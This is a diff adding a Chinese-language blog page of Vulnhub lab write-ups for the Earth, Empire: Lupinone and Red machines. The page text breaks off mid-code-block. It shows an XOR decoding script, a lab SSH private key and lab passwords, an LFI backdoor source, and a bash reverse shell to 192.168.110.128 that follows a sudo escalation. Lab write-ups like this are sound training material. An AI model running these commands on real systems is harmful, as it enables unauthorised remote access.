@@ -1,0 +1,328 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vulnhub - m4ao&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Earth信息收集
+设置dns
+
+目录扫描
+
+查看robots.txt
+
+1234567891011import binasciientry_str = &amp;#x27;2402111b1a070507,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="m4ao&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="Vulnhub - m4ao&#39;s blog"/>
+    <meta name="twitter:description" content="Earth信息收集
+设置dns
+
+目录扫描
+
+查看robots.txt
+
+1234567891011import binasciientry_str = &amp;#x27;2402111b1a070507,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="m4ao&#39;s blog"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="Vulnhub - m4ao&#39;s blog"/>
+    <meta property="og:description" content="Earth信息收集
+设置dns
+
+目录扫描
+
+查看robots.txt
+
+1234567891011import binasciientry_str = &amp;#x27;2402111b1a070507,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">m4ao&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Vulnhub</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Vulnhub</h1>
+        <div class="stuff">
+            <span>七月 26, 2023</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="Earth"><a href="#Earth" class="headerlink" title="Earth"></a>Earth</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/2023/07/26/Vulnhub/image-20230406174041792.png" alt="image-20230406174041792"></p>
+<h4 id="设置dns"><a href="#设置dns" class="headerlink" title="设置dns"></a>设置dns</h4><p><img src="/2023/07/26/Vulnhub/image-20230406174353475.png" alt="image-20230406174353475"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230406174340172.png" alt="image-20230406174340172"></p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><img src="/2023/07/26/Vulnhub/image-20230406175727682.png" alt="image-20230406175727682"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230406175757400.png" alt="image-20230406175757400"></p>
+<h4 id="查看robots-txt"><a href="#查看robots-txt" class="headerlink" title="查看robots.txt"></a>查看robots.txt</h4><p><img src="/2023/07/26/Vulnhub/image-20230406180139826.png" alt="image-20230406180139826"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230406180635383.png" alt="image-20230406180635383"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">entry_str = <span class="string">&#x27;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&#x27;</span></span><br><span class="line">pass_txt = <span class="string">&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span></span><br><span class="line"><span class="comment">#将pass_txt转换成16进制</span></span><br><span class="line">pass_txt_16 = binascii.b2a_hex(pass_txt.encode(encoding=<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#进行xor运算</span></span><br><span class="line">result = <span class="built_in">hex</span>(<span class="built_in">int</span>(entry_str,<span class="number">16</span>)^<span class="built_in">int</span>(pass_txt_16,<span class="number">16</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#将运算结果转换成字符串</span></span><br><span class="line">datatext = binascii.unhexlify(result).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(datatext)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><img src="/2023/07/26/Vulnhub/image-20230406190020371.png" alt="image-20230406190020371"></p>
+<h4 id="第一个-flag"><a href="#第一个-flag" class="headerlink" title="第一个 flag"></a>第一个 flag</h4><p><img src="/2023/07/26/Vulnhub/image-20230406190542421.png" alt="image-20230406190542421"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230406190615943.png" alt="image-20230406190615943"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/2023/07/26/Vulnhub/image-20230407113525460.png" alt="image-20230407113525460"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230407113435029.png" alt="image-20230407113435029"></p>
+<h2 id="EMPIRE-LUPINONE"><a href="#EMPIRE-LUPINONE" class="headerlink" title="EMPIRE: LUPINONE"></a>EMPIRE: LUPINONE</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/2023/07/26/Vulnhub/image-20230408170706724.png" alt="image-20230408170706724"></p>
+<p>访问80 端口 没有屌用</p>
+<p>常规页面扫描没有啥信息</p>
+<p>~myfile&#x2F; 404 尝试 Fuzz</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408172303629.png" alt="image-20230408172303629"></p>
+<p>访问</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408172330340.png" alt="image-20230408172330340"></p>
+<p>尝试 Fuzz 获取 密钥 文件</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.100.3/~secret/.mysecret.txt">http://192.168.100.3/~secret/.mysecret.txt</a></p>
+<p>base58 解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cGxD6KNZQddY6iCsSuqPzUdqSx4F5ohDYnArU3kw5dmvTURqcaTrncHC3NLKBqFM2ywrNbRTW3eTpUvEz9qFuBnyhAK8TWu9cFxLoscWUrc4rLcRafiVvxPRpP692Bw5bshu6ZZpixzJWvNZhPEoQoJRx7jUnupsEhcCgjuXD7BN1TMZGL2nUxcDQwahUC1u6NLSK81Yh9LkND67WD87Ud2JpdUwjMossSeHEbvYjCEYBnKRPpDhSgL7jmTzxmtZxS9wX6DNLmQBsNT936L6VwYdEPKuLeY6wuyYmffQYZEVXhDtK6pokmA3Jo2Q83cVok6x74M5DA1TdjKvEsVGLvRMkkDpshztiGCaDu4uceLw3iLYvNVZK75k9zK9E2qcdwP7yWugahCn5HyoaooLeBDiCAojj4JUxafQUcmfocvugzn81GAJ8LdxQjosS1tHmriYtwp8pGf4Nfq5FjqmGAdvA2ZPMUAVWVHgkeSVEnooKT8sxGUfZxgnHAfER49nZnz1YgcFkR73rWfP5NwEpsCgeCWYSYh3XeF3dUqBBpf6xMJnS7wmZa9oWZVd8Rxs1zrXawVKSLxardUEfRLh6usnUmMMAnSmTyuvMTnjK2vzTBbd5djvhJKaY2szXFetZdWBsRFhUwReUk7DkhmCPb2mQNoTSuRpnfUG8CWaD3L2Q9UHepvrs67YGZJWwk54rmT6v1pHHLDR8gBC9ZTfdDtzBaZo8sesPQVbuKA9VEVsgw1xVvRyRZz8JH6DEzqrEneoibQUdJxLVNTMXpYXGi68RA4V1pa5yaj2UQ6xRpF6otrWTerjwALN67preSWWH4vY3MBv9Cu6358KWeVC1YZAXvBRwoZPXtquY9EiFL6i3KXFe3Y7W4Li7jF8vFrK6woYGy8soJJYEbXQp2NWqaJNcCQX8umkiGfNFNiRoTfQmz29wBZFJPtPJ98UkQwKJfSW9XKvDJwduMRWey2j61yaH4ij5uZQXDs37FNV7TBj71GGFGEh8vSKP2gg5nLcACbkzF4zjqdikP3TFNWGnij5az3AxveN3EUFnuDtfB4ADRt57UokLMDi1V73Pt5PQe8g8SLjuvtNYpo8AqyC3zTMSmP8dFQgoborCXEMJz6npX6QhgXqpbhS58yVRhpW21Nz4xFkDL8QFCVH2beL1PZxEghmdVdY9N3pVrMBUS7MznYasCruXqWVE55RPuSPrMEcRLoCa1XbYtG5JxqfbEg2aw8BdMirLLWhuxbm3hxrr9ZizxDDyu3i1PLkpHgQw3zH4GTK2mb5fxuu9W6nGWW24wjGbxHW6aTneLweh74jFWKzfSLgEVyc7RyAS7Qkwkud9ozyBxxsV4VEdf8mW5g3nTDyKE69P34SkpQgDVNKJvDfJvZbL8o6BfPjEPi125edV9JbCyNRFKKpTxpq7QSruk7L5LEXG8H4rsLyv6djUT9nJGWQKRPi3Bugawd7ixMUYoRMhagBmGYNafi4JBapacTMwG95wPyZT8Mz6gALq5Vmr8tkk9ry4Ph4U2ErihvNiFQVS7U9XBwQHc6fhrDHz2objdeDGvuVHzPgqMeRMZtjzaLBZ2wDLeJUKEjaJAHnFLxs1xWXU7V4gigRAtiMFB5bjFTc7owzKHcqP8nJrXou8VJqFQDMD3PJcLjdErZGUS7oauaa3xhyx8Ar3AyggnywjjwZ8uoWQbmx8Sx71x4NyhHZUzHpi8vkEkbKKk1rVLNBWHHi75HixzAtNTX6pnEJC3t7EPkbouDC2eQd9i6K3CnpZHY3mL7zcg2PHesRSj6e7oZBoM2pSVTwtXRFBPTyFmUavtitoA8kFZb4DhYMcxNyLf7r8H98WbtCshaEBaY7b5CntvgFFEucFanfbz6w8cDyXJnkzeW1fz19Ni9i6h4Bgo6BR8Fkd5dheH5TGz47VFH6hmY3aUgUvP8Ai2F2jKFKg4i3HfCJHGg1CXktuqznVucjWmdZmuACA2gce2rpiBT6GxmMrfSxDCiY32axw2QP7nzEBvCJi58rVe8JtdESt2zHGsUga2iySmusfpWqjYm8kfmqTbY4qAK13vNMR95QhXV9VYp9qffG5YWY163WJV5urYKM6BBiuK9QkswCzgPtjsfFBBUo6vftNqCNbzQn4NMQmxm28hDMDU8GydwUm19ojNo1scUMzGfN4rLx7bs3S9wYaVLDLiNeZdLLU1DaKQhZ5cFZ7iymJHXuZFFgpbYZYFigLa7SokXis1LYfbHeXMvcfeuApmAaGQk6xmajEbpcbn1H5QQiQpYMX3BRp41w9RVRuLGZ1yLKxP37ogcppStCvDMGfiuVMU5SRJMajLXJBznzRSqBYwWmf4MS6B57xp56jVk6maGCsgjbuAhLyCwfGn1LwLoJDQ1kjLmnVrk7FkUUESqJKjp5cuX1EUpFjsfU1HaibABz3fcYY2cZ78qx2iaqS7ePo5Bkwv5XmtcLELXbQZKcHcwxkbC5PnEP6EUZRb3nqm5hMDUUt912ha5kMR6g4aVG8bXFU6an5PikaedHBRVRCygkpQjm8Lhe1cA8X2jtQiUjwveF5bUNPmvPGk1hjuP56aWEgnyXzZkKVPbWj7MQQ3kAfqZ8hkKD1VgQ8pmqayiajhFHorfgtRk8ZpuEPpHH25aoJfNMtY45mJYjHMVSVnvG9e3PHrGwrks1eLQRXjjRmGtWu9cwT2bjy2huWY5b7xUSAXZfmRsbkT3eFQnGkAHmjMZ5nAfmeGhshCtNjAU4idu8o7HMmMuc3tpK6res9HTCo35ujK3UK2LyMFEKjBNcXbigDWSM34mXSKHA1M4MF7dPewvQsAkvxRTCmeWwRWz6DKZv2MY1ezWd7mLvwGo9ti9SMTXrkrxHQ8DShuNorjCzNCuxLNG9ThpPgWJoFb1sJL1ic9QVTvDHCJnD1AKdCjtNHrG973BVZNUF6DwbFq5d4CTLN6jxtCFs3XmoKquzEY7MiCzRaq3kBNAFYNCoVxRBU3d3aXfLX4rZXEDBfAgtumkRRmWowkNjs2JDZmzS4H8nawmMa1PYmrr7aNDPEW2wdbjZurKAZhheoEYCvP9dfqdbL9gPrWfNBJyVBXRD8EZwFZNKb1eWPh1sYzUbPPhgruxWANCH52gQpfATNqmtTJZFjsfpiXLQjdBxdzfz7pWvK8jivhnQaiajW3pwt4cZxwMfcrrJke14vN8Xbyqdr9zLFjZDJ7nLdmuXTwxPwD8Seoq2hYEhR97DnKfMY2LhoWGaHoFqycPCaX5FCPNf9CFt4n4nYGLau7ci5uC7ZmssiT1jHTjKy7J9a4q614GFDdZULTkw8Pmh92fuTdK7Z6fweY4hZyGdUXGtPXveXwGWES36ecCpYXPSPw6ptVb9RxC81AZFPGnts85PYS6aD2eUmge6KGzFopMjYLma85X55Pu4tCxyF2FR9E3c2zxtryG6N2oVTnyZt23YrEhEe9kcCX59RdhrDr71Z3zgQkAs8uPMM1JPvMNgdyNzpgEGGgj9czgBaN5PWrpPBWftg9fte4xYyvJ1BFN5WDvTYfhUtcn1oRTDow67w5zz3adjLDnXLQc6MaowZJ2zyh4PAc1vpstCRtKQt35JEdwfwUe4wzNr3sidChW8VuMU1Lz1cAjvcVHEp1Sabo8FprJwJgRs5ZPA7Ve6LDW7hFangK8YwZmRCmXxArBFVwjfV2SjyhTjhdqswJE5nP6pVnshbV8ZqG2L8d1cwhxpxggmu1jByELxVHF1C9T3GgLDvgUv8nc7PEJYoXpCoyCs55r35h9YzfKgjcJkvFTdfPHwW8fSjCVBuUTKSEAvkRr6iLj6H4LEjBg256G4DHHqpwTgYFtejc8nLX77LUoVmACLvfC439jtVdxCtYA6y2vj7ZDeX7zp2VYR89GmSqEWj3doqdahv1DktvtQcRBiizMgNWYsjMWRM4BPScnn92ncLD1Bw5ioB8NyZ9CNkMNk4Pf7Uqa7vCTgw4VJvvSjE6PRFnqDSrg4avGUqeMUmngc5mN6WEa3pxHpkhG8ZngCqKvVhegBAVi7nDBTwukqEDeCS46UczhXMFbAgnQWhExas547vCXho71gcmVqu2x5EAPFgJqyvMmRScQxiKrYoK3p279KLAySM4vNcRxrRrR2DYQwhe8YjNsf8MzqjX54mhbWcjz3jeXokonVk77P9g9y69DVzJeYUvfXVCjPWi7aDDA7HdQd2UpCghEGtWSfEJtDgPxurPq8qJQh3N75YF8KeQzJs77Tpwcdv2Wuvi1L5ZZtppbWymsgZckWnkg5NB9Pp5izVXCiFhobqF2vd2jhg4rcpLZnGdmmEotL7CfRdVwUWpVppHRZzq7FEQQFxkRL7JzGoL8R8wQG1UyBNKPBbVnc7jGyJqFujvCLt6yMUEYXKQTipmEhx4rXJZK3aKdbucKhGqMYMHnVbtpLrQUaPZHsiNGUcEd64KW5kZ7svohTC5i4L4TuEzRZEyWy6v2GGiEp4Mf2oEHMUwqtoNXbsGp8sbJbZATFLXVbP3PgBw8rgAakz7QBFAGryQ3tnxytWNuHWkPohMMKUiDFeRyLi8HGUdocwZFzdkbffvo8HaewPYFNsPDCn1PwgS8wA9agCX5kZbKWBmU2zpCstqFAxXeQd8LiwZzPdsbF2YZEKzNYtckW5RrFa5zDgKm2gSRN8gHz3WqS</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----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\niUJ66WmRUN9EoVlkeCzQJwivI=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>生成 </p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408175423073.png" alt="image-20230408175423073"></p>
+<p>提示  使用 fasttrack</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408175632478.png" alt="image-20230408175632478"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408175815295.png" alt="image-20230408175815295"></p>
+<p>登录 ssh</p>
+<p>P@55w0rd!</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408180645072.png" alt="image-20230408180645072"></p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p><img src="/2023/07/26/Vulnhub/image-20230408182956093.png" alt="image-20230408182956093"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408183019334.png" alt="image-20230408183019334"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408183044934.png" alt="image-20230408183044934"></p>
+<h2 id="Red"><a href="#Red" class="headerlink" title="Red"></a>Red</h2><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/2023/07/26/Vulnhub/image-20230408202835999.png" alt="image-20230408202835999"></p>
+<p>Hello Blue 无法正常跳转</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408203135618.png" alt="image-20230408203135618"></p>
+<p>设置 hosts 文件</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408203252197.png" alt="image-20230408203252197"></p>
+<p>开始寻找后门</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408203653932.png" alt="image-20230408203653932"></p>
+<p>CommonBackdoors-PHP.fuzz.txt</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408210307401.png" alt="image-20230408210307401"></p>
+<p>盲猜 LFI 接着 Fuzz 参数值</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408212015635.png" alt="image-20230408212015635"></p>
+<p>读取 wp-config 文件</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230408213244336.png" alt="image-20230408213244336"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   $file = $_GET[&#x27;key&#x27;];</span><br><span class="line">   if(isset($file))</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;$file&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;NetworkFileManagerPHP.php&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">后面的再解码一遍</span><br><span class="line">That password alone won&#x27;t help you! Hashcat says rules are rules</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h3><p>密码 不对  </p>
+<p>根据提示 使用 hashcat </p>
+<p><img src="/2023/07/26/Vulnhub/image-20230409174716132.png" alt="image-20230409174716132"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230409175053445.png" alt="image-20230409175053445"></p>
+<p>R3v_m4lwh3r3_k1nG!!00 利用此密码登录ssh</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230409175540402.png" alt="image-20230409175540402"></p>
+<p>一下不交互 就会被踢出</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u ippsec /usr/bin/time /bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.110.128/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/Vulnhub/image-20230409180324352.png" alt="image-20230409180324352"></p>
+<p>获得一个完整的shell</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230409181458488.png" alt="image-20230409181458488"></p>
+<h3 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h3><p><img src="/2023/07/26/Vulnhub/image-20230409182850192.png" alt="image-20230409182850192"></p>
+<p>替换该文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 